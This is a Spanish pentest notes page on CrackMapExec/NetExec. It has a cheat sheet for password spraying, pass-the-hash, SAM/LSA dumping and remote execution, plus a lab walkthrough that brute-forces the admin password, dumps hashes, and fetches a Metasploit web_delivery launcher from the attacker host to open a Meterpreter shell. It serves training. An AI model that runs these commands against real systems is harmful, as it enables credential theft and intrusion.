
# CrackMapExec Lateral Movement

#### ¿Qué es CrackMapExec / NetExec?

CrackMapExec (CME) es una herramienta de post-explotación diseñada para automatizar la evaluación de seguridad en entornos Windows y Active Directory. Su creador la describe como una **"navaja suiza para hacer pruebas de penetración en redes"**. Se utiliza para movimiento lateral y toma de conciencia situacional en la red.

{% embed url="<https://github.com/byt3bl33d3r/crackmapexec>" %}

En 2023, el proyecto original se detuvo y fue bifurcado (fork) por la comunidad, dando lugar a **NetExec** (nxc), que es una reescritura completa con mejoras significativas en velocidad, eficiencia y soporte de protocolos. El cambio de nombre también ayuda a evadir detecciones basadas en el nombre "crack".

{% embed url="<https://github.com/Pennyw0rth/NetExec>" %}

> ⚠️ **Nota importante**: Si estás en versiones modernas de Kali Linux o Parrot OS, es probable que ya tengas `netexec` instalado en lugar de `crackmapexec`. Ambos comparten sintaxis muy similar, por lo que los comandos son prácticamente intercambiables.

***

#### Instalación

**Para usar CrackMapExec (versión original):**

```bash
sudo apt update && sudo apt install crackmapexec
```

**Para NetExec (recomendado en entornos actuales):**

```bash
# Instalación con pipx
pipx install git+https://github.com/Pennyw0rth/NetExec

# O clonando el repositorio
git clone https://github.com/Pennyw0rth/NetExec
cd NetExec
pip install -r requirements.txt
```

En las versiones más recientes de Kali Linux, **NetExec ya viene preinstalado** con el comando `nxc`.

***

#### Sintaxis general y flujo de trabajo

El comando básico sigue el siguiente patrón:

```bash
crackmapexec <protocolo> <objetivo> -u <usuario> -p <contraseña>
```

Cuando se ejecuta el comando, el objetivo puede ser una IP, un rango CIDR o un archivo con una lista de direcciones IP. Si la autenticación es exitosa y las credenciales proporcionadas tienen privilegios de administrador local en el objetivo, la salida mostrará la etiqueta **(Pwn3d!)** junto al nombre del host.

***

## <mark style="color:purple;">Cheatsheet</mark>

#### 🔹 Enumeración y reconocimiento de red

<table data-header-hidden><thead><tr><th width="292.25921630859375"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td><strong>Escanear red</strong> (detectar hosts activos)</td><td><code>crackmapexec smb 192.168.1.0/24</code></td></tr><tr><td><strong>Escanear usuario local</strong> (NO AD o DOMINIO)</td><td><code>crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'password' --local-auth</code></td></tr><tr><td><strong>Enumerar usuarios del dominio</strong></td><td><code>crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'password' --users</code></td></tr><tr><td><strong>Enumerar grupos del dominio</strong></td><td><code>crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'password' --groups</code></td></tr><tr><td><strong>Listar recursos compartidos (shares)</strong></td><td><code>crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'password' --shares</code></td></tr><tr><td><strong>Enumerar sesiones de usuarios conectados</strong></td><td><code>crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'password' --loggedon-users</code></td></tr><tr><td><strong>Volcar LSA Secrets</strong></td><td><code>crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'password' --lsa</code></td></tr><tr><td><strong>Volcar SAM</strong></td><td><code>crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'password' --sam</code></td></tr><tr><td><strong>Ver política de contraseñas</strong></td><td><code>crackmapexec smb &#x3C;DC_IP> -u 'user' -p 'pass' --pass-pol</code></td></tr><tr><td><strong>Enumerar discos y unidades</strong></td><td><code>crackmapexec smb &#x3C;target> -u 'user' -p 'pass' -M disks</code></td></tr></tbody></table>

#### 🔹 Autenticación y pruebas de credenciales

<table data-header-hidden><thead><tr><th width="297.4444580078125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td><strong>Probar una única credencial</strong></td><td><code>crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'password'</code></td></tr><tr><td><strong>Password spraying</strong> (un usuario contra varios hosts)</td><td><code>crackmapexec smb 192.168.1.0/24 -u 'Administrator' -p 'password'</code></td></tr><tr><td><strong>Password spraying</strong> (varios usuarios contra un host)</td><td><code>crackmapexec smb 192.168.1.105 -u users.txt -p 'password'</code></td></tr><tr><td><strong>Credential stuffing</strong> (diccionario de usuarios y contraseñas)</td><td><code>crackmapexec smb 192.168.1.105 -u users.txt -p passwords.txt</code></td></tr><tr><td><strong>Autenticación con dominio específico</strong></td><td><code>crackmapexec smb 192.168.1.105 -d DOMAIN -u Administrator -p password</code></td></tr><tr><td><strong>Autenticación con hash NTLM (Pass-the-Hash)</strong></td><td><code>crackmapexec smb 192.168.1.105 -u Administrator -H :aad3b435b51404eeaad3b435b51404ee</code></td></tr></tbody></table>

#### 🔹 Movimiento lateral y ejecución remota de comandos

{% hint style="info" %}
Importante: con `-x` ejecutamos comandos de CMD y con `-X` comandos de PowerShell
{% endhint %}

<table data-header-hidden><thead><tr><th width="305.59259033203125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td><strong>Ejecutar comando con método smbexec</strong></td><td><code>crackmapexec smb 192.168.1.105 -u Administrator -p password -x 'whoami'</code></td></tr><tr><td><strong>Ejecutar comando con PowerShell (WinRM)</strong></td><td><code>crackmapexec winrm 192.168.1.105 -u Administrator -p password -x 'whoami'</code></td></tr><tr><td><strong>Ejecutar comando con atexec</strong> (tareas programadas)</td><td><code>crackmapexec smb 192.168.1.105 -u Administrator -p password --exec-method atexec -x 'whoami'</code></td></tr><tr><td><strong>Ejecutar comando con wmiexec</strong></td><td><code>crackmapexec smb 192.168.1.105 -u Administrator -p password --exec-method wmiexec -x 'whoami'</code></td></tr><tr><td><strong>Ejecutar comando en todo un rango de red</strong></td><td><code>crackmapexec smb 192.168.1.0/24 -u Administrator -p password -x 'hostname'</code></td></tr><tr><td><strong>Ejecutar comando con NetExec (formato moderno)</strong></td><td><code>nxc smb 192.168.1.105 -u Administrator -p password -x 'whoami'</code></td></tr></tbody></table>

#### 🔹 Módulos especializados

<table data-header-hidden><thead><tr><th width="310.77783203125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td><strong>Listar módulos disponibles</strong></td><td><code>crackmapexec smb -L</code></td></tr><tr><td><strong>Usar módulo específico</strong></td><td><code>crackmapexec smb 192.168.1.105 -u user -p pass -M &#x3C;nombre_modulo></code></td></tr></tbody></table>

#### 🔹 NetExec (nxc): Comandos específicos

NetExec utiliza el comando `nxc` en lugar de `crackmapexec` y ofrece soporte nativo para múltiples protocolos adicionales:

<table data-header-hidden><thead><tr><th width="267.07403564453125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td><strong>Verificar acceso SMB</strong></td><td><code>nxc smb 192.168.1.105 -u administrator -p password</code></td></tr><tr><td><strong>Verificar acceso WinRM</strong></td><td><code>nxc winrm 192.168.1.105 -u administrator -p password</code></td></tr><tr><td><strong>Verificar acceso RDP</strong></td><td><code>nxc rdp 192.168.1.105 -u administrator -p password</code></td></tr><tr><td><strong>Ejecutar comando en todo un rango</strong></td><td><code>nxc smb 192.168.1.0/24 -u administrator -p password -x 'whoami'</code></td></tr><tr><td><strong>Usar hash NTLM con nxc</strong></td><td><code>nxc smb 192.168.1.105 -u administrator -H aad3b435b51404eeaad3b435b51404ee</code></td></tr><tr><td><strong>Ejecutar módulo específico con nxc</strong></td><td><code>nxc smb 192.168.1.105 -u user -p pass -M sam</code></td></tr></tbody></table>

***

## Lab: **SMB Server CrackMapExec**

Se le proporciona una máquina Kali GUI y una máquina objetivo que ejecuta un servicio SMB vulnerable. La máquina objetivo es accesible en **'demo.ine.local'** .

Tu tarea consiste en obtener la huella digital del servicio SMB utilizando las herramientas disponibles en la máquina Kali y, a continuación, usar la herramienta CrackMapExec para realizar una post-explotación en el servicio SMB y extraer información confidencial, como hashes de usuarios de Windows, secretos LSA, información de carpetas compartidas, etc.

**Objetivo:** ¡Aprovechar el servicio SMB para instalar un Meterpreter en el objetivo y recuperar la flag!

#### Hosts

Nuestro objetivo es `demo.ine.local`

```bash
┌──(root㉿attackdefense)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.6        attackdefense.com attackdefense
10.10.37.2      attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.2.26.75    demo.ine.local
```

### Escaneo de puertos

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV demo.ine.local                                                                                                                           

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Vemos que tenemos abierto el puerto 445 SMB, vamos a enumerarlo.

### Escaneo dirigido a SMB

```bash
┌──(root㉿attackdefense)-[~]
└─# nmap -sV -p 445 --script smb-* demo.ine.local

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| smb-protocols: 
|   dialects: 
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-print-text: false
```

Observamos que en `smb-protocols` tenemos varios disponibles, y no obtenemos nada más de información con los scripts.

### Bruteforce de SMB con CrackMapExec

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec smb 10.2.26.75 -u administrator -p /usr/share/wordlists/metasploit/unix_passwords.txt

SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:crystal STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:celtic STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:zxcvbnm STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:edward STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:oliver STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:diana STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:samsung STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:freedom STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:angelo STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:kenneth STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:master STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:scooby STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:carmen STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] EC2AMAZ-408S766\administrator:456789 STATUS_LOGON_FAILURE 
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
```

Encontramos la contraseña en plano de administrator: `sebastian`

### Enumeración de usuarios

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec smb 10.2.26.75 -u administrator -p 'sebastian' --users

SMB         10.2.26.75      445    EC2AMAZ-408S766  [*] Windows 10 / Server 2016 Build 14393 x64 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [-] Error enumerating domain users using dc ip 10.2.26.75: socket connection error while opening: [Errno 111] Connection refused
SMB         10.2.26.75      445    EC2AMAZ-408S766  [*] Trying with SAMRPC protocol
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] Enumerated domain user(s)
SMB         10.2.26.75      445    EC2AMAZ-408S766  EC2AMAZ-408S766\Administrator                  Built-in account for administering the computer/domain
SMB         10.2.26.75      445    EC2AMAZ-408S766  EC2AMAZ-408S766\auditor                        
SMB         10.2.26.75      445    EC2AMAZ-408S766  EC2AMAZ-408S766\DefaultAccount                 A user account managed by the system.
SMB         10.2.26.75      445    EC2AMAZ-408S766  EC2AMAZ-408S766\demo                           
SMB         10.2.26.75      445    EC2AMAZ-408S766  EC2AMAZ-408S766\Guest                          Built-in account for guest access to the computer/domain
SMB         10.2.26.75      445    EC2AMAZ-408S766  EC2AMAZ-408S766\sysadmin                       
```

### Ejecución de comandos

{% hint style="info" %}
Importante: con `-x` ejecutamos comandos de CMD y con `-X` comandos de PowerShell
{% endhint %}

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec smb 10.2.26.75 -u administrator -p 'sebastian' -x 'whoami'

SMB         10.2.26.75      445    EC2AMAZ-408S766  [*] Windows 10 / Server 2016 Build 14393 x64 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] Executed command 
SMB         10.2.26.75      445    EC2AMAZ-408S766  ec2amaz-408s766\administrator
```

### Módulos de CrackMapExec

Disponemos de multitud de módulos que podemos ejecutar contra el objetivo:

```
┌──(root㉿attackdefense)-[~]
└─# crackmapexec smb -L

[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] dfscoerce                 Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] drop-sc                   Drop a searchConnector-ms file on each writable share
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_netconnections        Uses WMI to query network connections.
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
[*] hash_spider               Dump lsass recursively from a given hash using BH to find local admins
[*] impersonate               List and impersonate tokens to run command as locally logged on users
[*] install_elevated          Checks for AlwaysInstallElevated
[*] ioxidresolver             Thie module helps you to identify hosts that have additional active interfaces
[*] keepass_discover          Search for KeePass-related files and process.
[*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
[*] lsassy                    Dump lsass and parse the result remotely with lsassy
[*] masky                     Remotely dump domain user credentials via an ADCS and a KDC
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] ms17-010                  MS17-010, /!\ not tested oustide home lab
[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
[*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] ntlmv1                    Detect if lmcompatibilitylevel on the target is set to 0 or 1
[*] petitpotam                Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
[*] procdump                  Get lsass dump using procdump64 and parse the result with pypykatz
[*] rdp                       Enables/Disables RDP
[*] runasppl                  Check if the registry value RunAsPPL is set or not
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shadowcoerce              Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] spider_plus               List files on the target server (excluding `DIR` directories and `EXT` extensions) and save them to the `OUTPUT` directory if they are smaller then `SIZE`
[*] spooler                   Detect if print spooler is enabled or not
[*] teams_localdb             Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
[*] test_connection           Pings a host
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] webdav                    Checks whether the WebClient service is running on the target
[*] wireless                  Get key of all wireless interfaces
[*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472
```

### Enumerar Shares

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec smb 10.2.26.75 -u administrator -p 'sebastian' --shares

SMB         10.2.26.75      445    EC2AMAZ-408S766  [*] Windows 10 / Server 2016 Build 14393 x64 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] Enumerated shares
SMB         10.2.26.75      445    EC2AMAZ-408S766  Share           Permissions     Remark
SMB         10.2.26.75      445    EC2AMAZ-408S766  -----           -----------     ------
SMB         10.2.26.75      445    EC2AMAZ-408S766  admin           READ,WRITE      
SMB         10.2.26.75      445    EC2AMAZ-408S766  ADMIN$          READ,WRITE      Remote Admin
SMB         10.2.26.75      445    EC2AMAZ-408S766  C               READ,WRITE      
SMB         10.2.26.75      445    EC2AMAZ-408S766  C$              READ,WRITE      Default share
SMB         10.2.26.75      445    EC2AMAZ-408S766  IPC$            READ            Remote IPC
SMB         10.2.26.75      445    EC2AMAZ-408S766  public          READ,WRITE      
```

### Volcar LSA Secrets

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec smb 10.2.26.75 -u administrator -p 'sebastian' --lsa

SMB         10.2.26.75      445    EC2AMAZ-408S766  [*] Windows 10 / Server 2016 Build 14393 x64 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] Dumping LSA secrets
SMB         10.2.26.75      445    EC2AMAZ-408S766  dpapi_machinekey:0xb6e42963e61bf9cd6ee692ccfe85fce12acca9ae
dpapi_userkey:0xeaa725d1fb1e5b39c2c925ede76c9b29d5a1c1c8                                                                                                                
SMB         10.2.26.75      445    EC2AMAZ-408S766  NL$KM:2e74ed5562cb0c23833dc65651ceb29363bc5fc9598b25db1ffcf9a226503160c467c4473bead701869b673170f930a14999f2296d1985d4f201bec065261920                                                                                                                                                      
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] Dumped 2 LSA secrets to /root/.cme/logs/EC2AMAZ-408S766_10.2.26.75_2026-04-10_004054.secrets and /root/.cme/logs/EC2AMAZ-408S766_10.2.26.75_2026-04-10_004054.cached
```

### Volcar Hashes

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec smb 10.2.26.75 -u administrator -p 'sebastian' --sam

SMB         10.2.26.75      445    EC2AMAZ-408S766  [*] Windows 10 / Server 2016 Build 14393 x64 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] Dumping SAM hashes
SMB         10.2.26.75      445    EC2AMAZ-408S766  Administrator:500:aad3b435b51404eeaad3b435b51404ee:94ebf4c21e29d139fd332a535626ad6e:::
SMB         10.2.26.75      445    EC2AMAZ-408S766  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.2.26.75      445    EC2AMAZ-408S766  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.2.26.75      445    EC2AMAZ-408S766  sysadmin:1011:aad3b435b51404eeaad3b435b51404ee:d6c5976e07cdb410be19b84126367e3d:::
SMB         10.2.26.75      445    EC2AMAZ-408S766  auditor:1012:aad3b435b51404eeaad3b435b51404ee:ba9a038e579c1d0263aedcef043243d9:::
SMB         10.2.26.75      445    EC2AMAZ-408S766  demo:1013:aad3b435b51404eeaad3b435b51404ee:74ed32086b1317b742c3a92148df1019:::
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] Added 6 SAM hashes to the database
```

### Pass the Hash

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec smb 10.2.26.75 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:94ebf4c21e29d139fd332a535626ad6e'

SMB         10.2.26.75      445    EC2AMAZ-408S766  [*] Windows 10 / Server 2016 Build 14393 x64 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:94ebf4c21e29d139fd332a535626ad6e (Pwn3d!)
```

### Web Delivery con CME

Para este ejemplo no usaremos el payload que nos genera, sino la URL

{% code overflow="wrap" %}

```bash
msfconsole
use exploit/multi/script/web_delivery
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.37.2
set target 2
exploit

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.37.2:4444 
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://10.10.37.2:8080/8xzZbs
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6<---SNIP--->
```

{% endcode %}

Nos genera la siguiente URL: `http://10.10.37.2:8080/8xzZbs` y ejecutamos el web delivery directamente con el siguiente comando:

```bash
┌──(root㉿attackdefense)-[~]
└─# crackmapexec smb 10.2.26.75 -u administrator -p 'sebastian' -M web_delivery -o URL=http://10.10.37.2:8080/8xzZbs

SMB         10.2.26.75      445    EC2AMAZ-408S766  [*] Windows 10 / Server 2016 Build 14393 x64 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.2.26.75      445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
WEB_DELI... 10.2.26.75      445    EC2AMAZ-408S766  [+] Executed web-delivery launcher
```

Y nos genera la sesión de Meterpreter:

```bash
[*] Sending stage (176198 bytes) to 10.2.26.75
[*] Meterpreter session 1 opened (10.10.37.2:4444 -> 10.2.26.75:49852) at 2026-04-10 01:00:01 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Acceso a la flag

```powershell
lmeterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2020-09-25 12:04:38 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2016-07-16 18:48:08 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2020-09-09 10:22:55 +0530  Boot
040777/rwxrwxrwx  0       dir   2016-10-18 07:29:39 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-02-23 16:36:05 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2017-12-14 02:30:56 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2020-09-25 12:13:29 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2016-11-24 05:49:28 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2016-10-18 07:31:27 +0530  Recovery
040777/rwxrwxrwx  0       dir   2020-09-25 11:43:59 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2020-09-25 11:45:39 +0530  Users
040777/rwxrwxrwx  28672   dir   2026-04-10 00:46:11 +0530  Windows
040777/rwxrwxrwx  0       dir   2026-04-10 00:46:11 +0530  admin
100444/r--r--r--  388690  fil   2020-09-02 13:52:08 +0530  bootmgr
100666/rw-rw-rw-  32      fil   2020-09-25 22:17:39 +0530  flag.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys
040777/rwxrwxrwx  0       dir   2026-04-10 00:46:11 +0530  public

meterpreter > cat flag.txt 
dc6738a4ac0d7a4a379eb300********
```
